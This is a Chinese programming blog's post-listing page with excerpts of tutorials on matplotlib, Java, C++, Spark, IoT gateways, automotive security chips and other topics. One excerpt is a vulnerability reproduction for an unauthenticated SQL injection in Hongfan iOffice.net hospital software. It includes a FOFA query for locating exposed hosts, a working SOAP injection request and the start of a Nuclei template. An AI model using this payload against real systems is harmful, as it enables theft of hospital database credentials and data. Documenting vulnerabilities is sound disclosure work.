<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程大咖</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:url" content="https://bcdaka.github.io/posts/">
  <meta property="og:site_name" content="编程大咖">
  <meta property="og:title" content="Posts">
  <meta property="og:description" content="编程大咖的博客">
  <meta property="og:locale" content="zh_CN">
  <meta property="og:type" content="website">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程大咖">

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大咖" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大咖</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/654f3e56ec71afcd6395f9eead0e9db5/" rel="bookmark">
			【Python】使用matplotlib绘制图形（曲线图、条形图、饼图等）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、什么是matplotlib二、matplotlib 支持的图形三、如何使用matplotlib1. 安装matplotlib2. 导入matplotlib.pyplot3. 准备数据4. 绘制图形5. 定制图形6. 显示或保存图形7. （可选）使用subplots创建多个子图注意事项： 四、常见图形使用示例1. 线图 (Line Plot)2. 散点图 (Scatter Plot)3. 条形图 (Bar Chart)4. 直方图 (Histogram)5. 饼图 (Pie Chart)6. 直方图 2d7. 面积图（Area Plot）8. 热力图（Heatmap）9. 三维图形（3D Plot）10. 堆叠图（Stacked Plot） 五、常用函数参考 一、什么是matplotlib matplotlib 是一个用于创建静态、动态和交互式可视化图形的 Python 库。它被广泛用于数据可视化，并且可以与多种操作系统和图形后端一起工作。matplotlib 提供了一套与 MATLAB 相似的命令 API，适合交互式制图，也可以作为绘图控件嵌入到其他应用程序中。
matplotlib 的主要组成部分是 pyplot，它是一个类似于 MATLAB 的绘图框架。pyplot 提供了一个 MATLAB 式的接口，可以隐式地创建图形和轴，使得绘图变得简单。
以下是一个简单的 matplotlib 使用示例，用于绘制一条简单的折线图：
import matplotlib.pyplot as plt import numpy as np # 创建数据 x = np.linspace(0, 10, 100) y = np.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/654f3e56ec71afcd6395f9eead0e9db5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f72252101b16212739f410941cc37860/" rel="bookmark">
			前端练习小项目——视觉冲击卡片
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言： 前言：在学习完HTML和CSS之后，我们就可以开始做一些小项目了，本篇文章所讲的小项目为——视觉冲击卡片
✨✨✨这里是秋刀鱼不做梦的BLOG
✨✨✨想要了解更多内容可以访问我的主页秋刀鱼不做梦-CSDN博客
先让我们看一下效果： 那么我们如何去实现这样的小案例呢？在下文中我们对每一段重要的代码都进行了解释，读者可以根据注释对代码进行理解。
1.HTML代码 &lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;!-- 设置文档使用的字符编码为UTF-8 --&gt; &lt;meta charset="UTF-8"&gt; &lt;!-- 响应式设计，页面宽度等于设备宽度，初始缩放为1.0 --&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;!-- 网页标题 --&gt; &lt;title&gt;zjy&lt;/title&gt; &lt;!-- 引入样式表视觉冲击卡片.css --&gt; &lt;link rel="stylesheet" href="./视觉冲击卡片.css"&gt; &lt;/head&gt; &lt;body&gt; &lt;!-- 网页内容部分 --&gt; &lt;div class="shell"&gt; &lt;!-- 第一个卡片 --&gt; &lt;div class="card"&gt; &lt;!-- 卡片内部包裹层 --&gt; &lt;div class="wrapper"&gt; &lt;!-- 卡片封面图片 --&gt; &lt;img src="./image/01.png" alt="" class="cover-image"&gt; &lt;/div&gt; &lt;!-- 卡片标题文本 --&gt; &lt;img src="./image/text-1.png" alt="" class="title"&gt; &lt;!-- 卡片角色图片 --&gt; &lt;img src="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f72252101b16212739f410941cc37860/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ca7a69c58d25a2172d0854b7fbdd26b0/" rel="bookmark">
			python从入门到精通1：注释
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 在Python编程中，注释是一种非常重要的工具，它不仅可以帮助我们记录代码的目的、工作方式以及任何需要注意的地方，还可以使代码更具可读性。Python提供了两种主要的注释方式：单行注释和多行注释。下面我们将深入探讨这两种注释方式以及它们在实际编程中的应用。
一、单行注释
在Python中，单行注释以井号（#）开始，井号之后的内容都是注释，Python解释器会忽略这些内容。
示例：
# 这是一个单行注释 print("Hello, World!") # 这也是一个单行注释，位于代码行的末尾 单行注释通常用于解释代码的功能、参数、返回值等。它们可以放在代码行的开头或末尾，但通常建议放在代码行上方或旁边，以便更容易地与代码关联起来。
二、多行注释
Python本身并没有直接支持多行注释的语法，但我们可以使用三引号（''' 或 """）来创建多行字符串，并将其用作注释。虽然这些字符串在技术上是可以被访问的，但通常我们不会这样做，而是将它们用作多行注释。
示例：
""" 这是一个多行注释的示例。 你可以在这里写下多行文字来解释你的代码， 例如描述一个函数的目的、参数、返回值等。 """ def greet(name): """ 这个函数用于向用户问好。 参数: name -- 用户的名字（字符串类型） 返回值: greeting -- 包含用户名字的问候语（字符串类型） """ greeting = 'Hello, ' + name return greeting 在上面的示例中，我们使用了三引号来创建了两个多行注释。第一个注释位于函数定义之前，用于描述整个函数的目的。第二个注释位于函数内部，用于描述函数的参数、返回值等信息。这种注释方式在编写复杂的函数或类时非常有用，因为它可以帮助我们和其他人更好地理解代码的工作原理。
三、注释的最佳实践
保持简洁明了：注释应该简洁明了，避免冗长和复杂的句子。使用简单、直接的语言来描述代码的功能和目的。及时更新：当代码发生更改时，确保注释也相应地更新。过时的注释可能会误导读者并导致混淆。避免冗余：不要为简单的、自解释的代码添加注释。例如，对于像 x = 1 这样的简单语句，通常不需要添加注释来解释其意义。使用有意义的变量名：良好的变量命名可以使代码更具可读性，并减少对注释的依赖。例如，使用 total_count 而不是 tc 作为变量名。遵循团队规范：在团队项目中，确保遵循团队的注释规范。这有助于保持代码风格的一致性并提高代码的可维护性。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/efd48b986725836cc91d367222f024b2/" rel="bookmark">
			物联网边缘网关在物联网应用中有哪些优势？天拓四方
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		随着物联网技术的快速发展，越来越多的设备接入网络，数据交互日益频繁，对数据处理和传输的要求也越来越高。在这样的背景下，物联网边缘网关应运而生，以其低延迟、减少带宽消耗、提高数据质量和安全性等优势，为物联网应用提供了强大的支持。
物联网边缘网关的应用场景广泛，几乎涵盖了所有需要实时数据处理和传输的领域。在工业场景中，边缘计算网关可以实时处理海量传感器和设备的数据，实现对运行、制造过程的全环节实时监控、控制和分析，提高了工业物联网的运行效率。物联网边缘网关充当着数据收集与处理的桥梁。它能够实时接收来自生产线上的各种传感器和设备的数据，包括温度、湿度、压力、振动等。这些数据经过边缘网关的初步处理后，可以被用于监控设备的运行状态，及时发现潜在故障，提高生产线的稳定性和可靠性。同时，通过对这些数据的深入分析，企业还可以优化生产流程，提高生产效率，降低运营成本。
物联网边缘网关的优势主要体现在以下几个方面。首先，它实现了分布式和低延时计算，能够更好地支撑本地业务的实时智能化处理与执行。由于边缘计算距离用户更近，在边缘节点处实现了对数据的过滤和分析，因此效率更高。其次，边缘计算网关有助于减少带宽消耗。通过将计算和存储资源放置在边缘位置，可以将部分数据在本地进行处理和存储，减少了对云端带宽的消耗。此外，边缘计算网关还提高了数据的隐私和安全性。将数据处理和存储放置在本地，可以减少敏感数据的传输，同时也可以在本地对数据进行预处理和过滤，提高数据的质量和安全性。
除了上述优势，物联网边缘网关还具备其他诸多特点。例如，它支持多种通信方式，包括全网通5G/4G网络、广域网、局域网等，可以灵活适应不同的网络环境。同时，它拥有丰富的协议库，支持多种通信协议，方便与不同类型的物联网设备进行通信。此外，物联网边缘网关还具备强大的数据采集功能，可以实现对串口数据、模拟量和开关量信号、局域网数据的采集，并转发至指定服务器。
在安全性方面，物联网边缘网关采用了多种安全措施，如数据加密、防火墙等，以保障设备与用户数据的安全。同时，它还可以过滤掉异常数据，阻止恶意攻击，为物联网设备提供安全防护。
物联网边缘网关产品
天拓四方TDE系列产品是一款数据采集网关，这款网关集成了智能边缘计算功能，可轻松实现现场设备的远程数据采集、程序远程下载及远程维护。其强大的兼容性支持超过300种的工业设备驱动协议，同时配备了2路RJ45以太网接口以及最多5路串口通讯接口，足以满足大多数工业控制器设备的联网需求。此外，TDE系列还支持以太网宽带、4G/5G以及Wifi等多种上网方式，确保在各种网络环境下都能稳定连接。通过数网星工业云平台，用户可以轻松实现对该网关的远程配置、诊断和管理，大大提高了工作效率和便利性。
总的来说，物联网边缘网关以其低延迟、减少带宽消耗、提高数据质量和安全性等优势，在物联网应用中发挥着越来越重要的作用。未来，随着物联网技术的进一步发展，物联网边缘网关将会更加智能化、高效化，为我们的生活带来更多便利和可能性。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d9d1755bbd756a5d97e2c0fbb98b371c/" rel="bookmark">
			Java中的内部类（如果想知道Java中有关内部类的知识点，那么只看这一篇就足够了！）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言：当一个事物的内部，还有一个部分需要一个完整的结构进行描述，而这个内部的完整的结构又只为外部事物提供服务，那么这个内部的完整结构最好使用内部类。在 Java 中，可以将一个类定义在另一个类或者一个方法的内部，前者称为内部类，后者称为外部类。
✨✨✨这里是秋刀鱼不做梦的BLOG
✨✨✨想要了解更多内容可以访问我的主页秋刀鱼不做梦-CSDN博客
先让我们看一下本文的大致内容：
目录
1.内部类的分类及作用
（1）成员内部类（Member Inner Class）
（2）静态内部类（Static Nested Class）
（3）局部内部类（Local Inner Class）
（4）匿名内部类（Anonymous Inner Class）
内部类的作用总结：
2.实例内部类
（1）实例内部类的大致定义形式：
（2）实例内部类对象的创建
（3）综合案例
3.静态内部类
（1）静态内部类的大致定义形式：
（2）静态内部类对象的创建
（3）综合案例
4.局部内部类
（1）局部内部类的大致定义形式：
（2）局部内部类对象的创建
（3）综合案例
5.匿名内部类
（1）匿名内部类的大致定义形式：
（2）局部内部类对象的创建
（3）综合案例
1.内部类的分类及作用 在前言中我们已经大致的了解了Java中的内部类，但是在开始学习各种内部类之前，先让我们了解一下有哪些内部类及各个内部类的作用，根据其定义位置和特性，内部类可以分为以下几种主要类型：
（1）成员内部类（Member Inner Class） ——定义位置： 成员内部类定义在一个类的内部，作为该类的成员，与类的其他成员（字段、方法等）处于同一层次。
——作用： 成员内部类可以访问外部类的所有成员（包括私有成员），并且可以被外部类的方法调用。它通常用于与外部类有密切关系的场景，如实现某种数据结构的迭代器或者实现某种特定逻辑的辅助类。
（2）静态内部类（Static Nested Class） ——定义位置： 静态内部类使用 static 关键字修饰，与外部类的实例无关，通常定义在外部类的内部作为静态成员。
——作用： 静态内部类可以直接通过外部类的类名访问，不需要依赖外部类的实例。它通常用于组织和封装与外部类紧密相关的辅助功能，例如工具类或者单例模式的实现。
（3）局部内部类（Local Inner Class） ——定义位置： 局部内部类定义在方法内部，作为方法的局部变量。
——作用： 局部内部类的作用域仅限于所在方法内部，通常用于封装一些复杂的逻辑或者需要单次使用的类定义。它可以访问方法的参数和局部变量，但是这些变量必须声明为 final 或者是实际上的 final（即不可再被修改）。
（4）匿名内部类（Anonymous Inner Class） ——定义位置： 匿名内部类没有显式的类名，在创建对象的同时直接实现类的定义。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d9d1755bbd756a5d97e2c0fbb98b371c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/03c7e426e03c6855d63415252eee8ae0/" rel="bookmark">
			汽车信息安全硬件讨论:SE vs HSM
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1.什么是Secure Element
2.芯片内置HSM和SE
3.未来HSM的发展
现在的智能网联汽车看起来像是一个连接万物的智能移动终端，它不仅可以与OEM云服务器通信接收OTA推送，还可以与手机蓝牙、Wifi交互完成远程汽车解锁、座舱内环境设置等等，借用Vector一张比较老的V2X描述，如下：
所有红色闪电都属于汽车的对外接口，很容易受到攻击，因此对接口进行安全加固防御非常关键，需要思考的加固方向如：车外安全通信、车内安全网关、车内安全通信、车内敏感数据安全存储等。
据统计，OEM对于上述关键接口在硬件层面上采用安全芯片(SE)+芯片内置HSM的策略来构建整车信息安全纵深防御架构。
那么什么是SE，用在哪里？芯片内置HSM与SE之间的不同在哪里？我们来具体看看。
1.什么是Secure Element SE这个东西其实大家经常用，那就是智能手机的使用。
从外观形式上看，它是一颗独立的芯片，有内核，有Flash、Ram\ROM、加密引擎等等，用于敏感数据的存储或者是需要信息安全覆盖的APP运行，例如我们的手机银行、支付宝等等，此外，它还负责保证在其内部的代码、数据免受恶意软件攻击，具备硬件防篡改能力(物理拆解SE，芯片自毁)。
由于它是一颗独立芯片，因此需要采用协议与外部通信，例如SPI、I2C。通常情况SE会嵌入到手机本身，或者eSIM卡，我们不关心也是自然。下图为SE芯片的一个NFC用法：
那么在汽车行业里，SE会用在哪里呢？
首先现在的汽车与十年前传统汽车，在网联化和智能化方面有了长足的发展，在功能上也有了很多进步，特别是在人机交互方面。
总结一下，目前已知的对外接口包括：蓝牙、充电桩、无钥匙进入系统、移动基站通信、雷达、USB、OBD、手机无线充电、Wi-Fi，如下:
对于黑客来说，这些接口都可以作为攻击点，故障注入、侧信道攻击、非侵入攻击都可以成为其攻击手段。
上述所有的连接其实就是我们聊了很久的V2X(Vehicle-to-everything)技术：利用传感器、摄像头、无线通信技术将汽车与其周围环境连接起来，保证道路驾驶安全。V2X根据通信终端不同，可以分为如下几大类：
V2V：Vehicle to Vehicle,汽车之间能够交换速度、位置和方向的数据；V2P：Vehicle to Pedestrian ，用于感知车辆周边行人等；V2N：Vehicle to Network，用于与其他网络交互，例如5G、LTE等；V2I：Vehicle to Infrastructure ，用于汽车与道路基础设施(如智能交通灯或道路标志)之间交互 可以看到，上述应用场景中比较关键的是V2X数据通信的完整性、车辆身份真实性和驾驶员隐私性，这与V2X终端信息处理能力密切相关，目前主流技术路线是使用专门的安全芯片来完成消息的验签、数据存储等等。
针对V2X通信，NXP推出SXF1800专门用于用于保护移动支付和保护V2X通信(ECC)验签，如下图：
针对无钥匙进入，NXP推出NCJ37A，有特定的硬件密码加速器，具有防物理\电气攻击的能力，主要用于存储和数字密钥管理，可以与NFC配套组成汽车智能门禁系统，如下：
英飞凌针对V2X通信推出SLS37，用于保护V2X通信，特别是针对TBOX和RSU(roadside units)，示意如下：
SLS37与主控MCU通过SPI加密通信，它提供了最高级别的防篡改保护机制，ECDSA签名速度可达20个每秒。
国内针对这类芯片的公司包括紫光同芯、华大微电子、国民技术等，例如紫光的THD89 eSIM SE，可用于数字钥匙、TBOX、eUICC等
华大CIU98系列面向C-V2X、数字钥匙、汽车TBOX、OBE_SAM等
因此，我们可以简单总结，安全芯片SE本质上一颗独立特定功能芯片，对于终端用户来说包括安全硬件和安全软件两个部分：安全硬件包括安全的运行环境、安全存储、安全算法、安全接口等；安全软件提供安全的交互机制，确保SE与主控单元之间命令和数据的交互安全，基于SE对数据进行安全处理、安全计算、安全存储等安全功能，实现设备的身份认证、数据传输加密、敏感信息保护等功能。
这类芯片由于属于信息安全产品的范畴，一般会去过各种认证，包括
CC EAL(Common Criteria Evaluation Assurance Level认证，目前EAL分为EAL1-7个等级，其中。EAL 7为最高等级，一般需要通过一系列的安全功能测试，以及代码审计、漏洞分析和安全功能强化，并需要提供安全策略和配置指南，以及进行安全功能强化，并需要进行代码审计、漏洞分析和安全功能强化。FIPS 140-2: NIST针对加密模块的安全认证，分为L1-L4，L4等级最高。 NXP SXF1800满足EAL 4+（在EAL4基础上升级了部分检测项目）FIPS 140-2 L3，THD89 EAL 4+，英飞凌SLI97 EAL5+等等。
2.芯片内置HSM和SE 目前我们接触到的车规MCU里通常都会HSM，个人理解，这是在通用汽车MCU的基础上，提供了一个芯片内部的安全隔离环境，通过加入密码引擎、融入真随机数、调试保护等安全要素，提供安全调试、安全启动、安全更新、安全隔离、安全算法、安全存储、故障注入防护等安全服务系统功能。
针对车规MCU的HSM，目前公认的是EVITA项目，根据不同场景分为了EVITA Light、Medium、Full三种变体，如下图：
EVITA HSM主要面向的是是V2X、车内通信、执行器传感器等的保护，例如提出了基于CAN的SecOC、基于调试接口攻击的保护手段；而这个项目是2008年发起，发展至今，黑客的攻击手段随着汽车行业的整体发展变得更加多样，例如侧信道攻击、故障注入攻击等等。
Evita HSM逐渐变得不满足需求，而保护级别更高的SE芯片恰好可以配合Evita HSM，共筑整体的网络安全防御体系。
3.未来HSM的发展 随着中央集中式电子电气架构的推进，HSM自然也会有进一步的发展。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/03c7e426e03c6855d63415252eee8ae0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/770e9f81d874596fda18a17bc36820e6/" rel="bookmark">
			矿大数据结构 实验三
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		A.二叉链表存储的二叉树 定义节点 --- 建立二叉树的函数 --- 前序遍历函数 --- 中序遍历函数
#include&lt;bits/stdc++.h&gt; #define ll long long using namespace std; struct Node{ //节点，用char存储本身的数据，指针指向左右节点 char data; Node *lc; Node *rc; Node(char c):data(c),lc(NULL),rc(NULL){} }; Node* build(string s,int&amp; i){ //i代表当前的位置 if(i&gt;=s.length()||s[i]==' ') return NULL; Node* root = new Node(s[i]); i++; root-&gt;lc=build(s,i); i++; root-&gt;rc=build(s,i); return root; } void pre_order(Node *root){ if(root==NULL) return; cout&lt;&lt;root-&gt;data&lt;&lt;' '; pre_order(root-&gt;lc); pre_order(root-&gt;rc); } void mid_order(Node*root){ if(root==NULL) return ; mid_order(root-&gt;lc); cout&lt;&lt;root-&gt;data&lt;&lt;' '; mid_order(root-&gt;rc); } void midord(Node *root){ } int main() { string s; getline(cin,s); int i=0; Node *root = build(s,i); pre_order(root); cout&lt;&lt;'\n'; mid_order(root); cout&lt;&lt;'\n'; mid_order(root); } B.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/770e9f81d874596fda18a17bc36820e6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3742945994531a9a454ebb16acc03ce0/" rel="bookmark">
			Day15—热点搜索词统计
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、要求 根据用户上网的搜索记录对每天的热点搜索词进行统计，以了解用户所关心的热点话题。
要求完成：统计每天搜索数量前3名的搜索词（同一天中同一用户多次搜索同一个搜索词视为1次）。
二、数据 三、配置scala环境 1.下载scala插件 Scala插件的安装有两种方式：在线与离线。我们学习在线安装方式。
启动IDEA，在欢迎界面中选择Configure→Plugins命令，搜索scala进行下载
2.配置scala环境 下载后的scala进行环境配置
在Project Settings-&gt;Libraries中添加下载好的Scala
3.创建scala class 4.编写scala代码 package org.example import org.apache.spark.rdd.RDD import org.apache.spark.sql.{Row, SparkSession} import org.apache.spark.sql.types._ import scala.collection.mutable.ListBuffer object keywords { def main(args: Array[String]): Unit = { //构建SparkSession // 构建SparkSession val spark = SparkSession.builder() .appName("YourAppName") // 设置应用程序的名称，显示在Spark UI中 .master("local[*]") // 设置Spark应用程序运行的主节点和资源 .getOrCreate() // 创建或获取已存在的SparkSession对象 //读取数据 val linesRDD: RDD[String] = spark.sparkContext.textFile("data/keywords.txt") // 使用map算子操作转换RDD中的每个元素 val transformedRDD = linesRDD.map(line =&gt; { val fields = line.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3742945994531a9a454ebb16acc03ce0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d15b70c0297bb320f3fd23632f51f71d/" rel="bookmark">
			【漏洞复现】红帆iOffice.net wssRtSyn接口处存在SQL注入
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【产品&amp;&amp;漏洞简述】 红帆iOffice.net从最早满足医院行政办公需求（传统OA），到目前融合了卫生主管部门的管理规范和众多行业特色应用，是目前唯一定位于解决医院综合业务管理的软件，是最符合医院行业特点的医院综合业务管理平台，是成功案例最多的医院综合业务管理软件。
红帆iOffice.net wssRtSyn.asmx接口处存在SQL注入漏洞，未经身份认证的攻击者可通过该漏洞获取数据库敏感信息及凭证，最终可能导致服务器失陷。
【资产测绘Query】 app="红帆-ioffice" 【产品界面】 【poc】 POST /iOffice/prg/set/wss/wssRtSyn.asmx HTTP/1.1Host: your-ipUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36Content-Type: text/xmlAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: gzip,deflateConnection: Keep-alive&lt;?xml version="1.0"?&gt;&lt;soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://iOffice.net/iOffice/ioRtSyn"&gt;&lt;soap:Header /&gt;&lt;soap:Body&gt;&lt;tns:SubmitLogInfo&gt;&lt;tns:data&gt;qwe&lt;/tns:data&gt;&lt;tns:ServerHost&gt;1'+(SELECT CHAR(103)+CHAR(105)+CHAR(75)+CHAR(83) WHERE 6621=6621 AND 7795 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(122)+CHAR(113)+(SELECT @@version)+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(120)+CHAR(113))))+'&lt;/tns:ServerHost&gt;&lt;/tns:SubmitLogInfo&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt; 【Nuclei-Poc验证】 id: hongfan-iOffice-wssRtSyn-sqliinfo:name: 红帆iOffice.net wssRtSyn接口处存在SQL注入漏洞author: 王阿姨介绍的severity: criticaldescription: 红帆iOffice.net wssRtSyn接口处存在SQL注入漏洞，未经身份认证的攻击者可通过该漏洞获取数据库敏感信息及凭证，最终可能导致服务器失陷。reference:metadata:verified: truemax-request: 1fofa-query: FOFA:app="红帆-ioffice"tags: sqlirequests:- raw:- |POST /iOffice/prg/set/wss/ioDesktopData.asmx HTTP/1.1Host: {{Hostname}}User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d15b70c0297bb320f3fd23632f51f71d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a06cef463e4aea14313afba89ce99c31/" rel="bookmark">
			【C&#43;&#43;】类和对象（三）构造与析构
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、类的6个默认成员函数二、 构造函数干嘛的？语法定义特性综上总结什么是默认构造函数？ 三、析构函数干嘛的 ？语法定义析构顺序 一、类的6个默认成员函数 如果一个类中什么成员都没有，简称为空类。空类中并不是真的什么都没有。任何类在什么都不写时，编译器会自动生成以下6个默认成员函数。
默认成员函数：用户没有显式实现，编译器会生成的成员函数称为默认成员函数。
二、 构造函数 干嘛的？ 构造函数是特殊的成员函数 用来初始化对象 。
语法定义 1️⃣函数名和类名相同
2️⃣没有返回值（不需要写）
代码演示：
class Date { public: //函数名与类名相同 没有返回值 不用写void Date() { _year = 1; _month = 1; _day = 1; } void Print() { cout &lt;&lt; _year &lt;&lt; "-" &lt;&lt; _month &lt;&lt; "-" &lt;&lt; _day &lt;&lt; endl; } private: int _year; int _month; int _day; }; int main() { Date d1; d1.Print(); return 0; } 3️⃣对象实例化时 编译器自动调用该函数，如果没有构造函数可调，会报错。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a06cef463e4aea14313afba89ce99c31/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e7f940733ff4cc640643399d4458fba0/" rel="bookmark">
			【Android】Android Studio版本手动升级到指定版本方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 Android Studio本身存在自动升级的功能，但是这个功能使用的时候基本都是要升级到最新版本，但是有时候我们也不想升级到最新版本，是想升级到某一个版本，这个时候，Android Studio的自动升级版本的功能就无法使用了，需要我们进行手动升级。
自动升级方法 点击这里就可升级了，自动升级非常方便，或者
在设置里面也可以检查升级，而且这里面还可以选择升级什么版本，但是这样也是升级到最新版本的。
版本类型说明：
1、Canary Channel：金丝雀版（包含最新功能，但存在较多bug）
2、Dev Channel：开发者版（已解决大部分Bug）
3、Beta Channel：测试版（部分bug已解决）
4、Stable Channel：正式稳定版
要是不追求特定版本的话可以使用这个升级，直接升级到最新版本，但是如果要是升级到某一个特定版本就不行了。
升级到特定目标版本 这个需要手动下载指定版本的安装包进行安装，但是这个Android 官网有个问题，有时候找不到特定的历史版本的安装包，直接进去的话就是最新版本的东西
链接: 安卓官网
我们进去之后，直接显示的就是
然后我们下滑之后，看到这个
然后点击这个下载归档之后
直接给我干懵逼了，这咋整？
解决方式 我们知道，Android 这个官网地址长这样
官网地址
https://developer.android.google.cn/studio?hl=zh-cn 修改一下这个地址，修改为
https://developer.android.google.cn/studio/archive 进入到这个页面
然后就可以下载自己需要的版本了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/08b812a676fb3519935bd06ac5d0e002/" rel="bookmark">
			Spacedrive：一个开源的跨平台文件管理器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 Spacedrive简介1.1 什么是Spacedrive？1.2 Spacedrive的核心功能1.3 Spacedrive的开发状态 Spacedrive的功能与特点2.1 文件存储在哪里？2.2 与传统文件管理器的区别2.3 与云存储服务的区别2.4 跨设备文件管理2.5 文件分类与过滤 Spacedrive的技术架构3.1 虚拟分布式文件系统（VDFS）VDFS的优势 3.2 Rust编写的好处性能安全性并发处理 3.3 跨平台支持使用Tauri框架跨平台开发的挑战与解决方案 Spacedrive的安装与配置4.1 桌面安装程序4.2 Homebrew安装4.3 Docker安装4.4 使用SD_AUTH环境变量4.5 禁用身份验证 Spacedrive的社区与支持5.1 开发者指南5.2 安全政策5.3 社区参与和贡献 Spacedrive的未来展望6.1 技术发展趋势6.2 用户反馈与改进6.3 新功能计划 Spacedrive简介 1.1 什么是Spacedrive？ Spacedrive 是一个免费的开源应用程序，它将您从不同存储位置的所有文件整合到一个地方。它是一个由数据库驱动的文件浏览器，允许您以传统文件浏览器或云服务无法实现的方式组织和搜索文件。Spacedrive 的核心理念是通过一个虚拟分布式文件系统（VDFS）来模拟一个去中心化的数据库，该系统索引硬件文件系统以创建一个在运行 Spacedrive 的设备之间实时同步的主数据库。
Spacedrive 不仅仅是一个文件管理器，它是一个个人分布式云，通过索引和虚拟化技术，将不同来源的文件整合在一起，提供一个高效、安全和直观的文件管理环境。无论您的文件存储在本地硬盘、网络驱动器还是云服务中，Spacedrive 都能为您提供一个统一的视图和访问接口。
1.2 Spacedrive的核心功能 跨平台文件管理：Spacedrive 可以在多个操作系统上运行，包括 Windows、macOS、Linux 和移动设备，提供一致的文件管理体验。虚拟分布式文件系统（VDFS）：通过 VDFS，Spacedrive 能够将不同设备和云服务的文件整合到一个统一的视图中，即使这些文件在物理上分布在不同位置。实时同步：Spacedrive 的主数据库在所有设备之间实时同步，确保您在任何设备上的操作都能立即反映在其他设备上。文件分类与过滤：用户可以创建文件夹、标签和专辑，这些分类可以包含来自不同位置的文件，使得文件管理更加灵活和高效。隐私与安全：Spacedrive 不提供额外的存储空间，而是通过索引现有存储位置来工作，确保您的文件仍然存储在您选择的位置，同时提供一个安全的文件管理界面。 1.3 Spacedrive的开发状态 Spacedrive 目前处于 alpha 阶段，下载已经可用，但存在一些缺失的功能和一些恼人的错误。开发团队正在迅速工作以修复这些问题。Spacedrive 的开发得到了风险投资的支持，并且它将始终保持开源和免费。
